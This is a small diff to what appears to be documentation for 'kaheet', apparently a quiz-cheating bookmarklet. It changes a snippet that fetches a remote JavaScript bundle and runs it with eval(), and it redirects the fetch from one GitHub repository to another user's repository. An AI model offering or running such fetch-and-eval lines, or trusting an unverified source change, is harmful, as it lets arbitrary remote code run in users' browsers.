@@ -28,7 +28,7 @@
 
 ```ts
 fetch(
-    "https://raw.githubusercontent.com/pxtrez/kaheet/main/dist/bundle.js"
+    "https://raw.githubusercontent.com/B3RKYB/asdf/main/kaheet-main/dist/bundle.js"
 ).then((r) => r.text().then((t) => eval(t)));
 ```
 
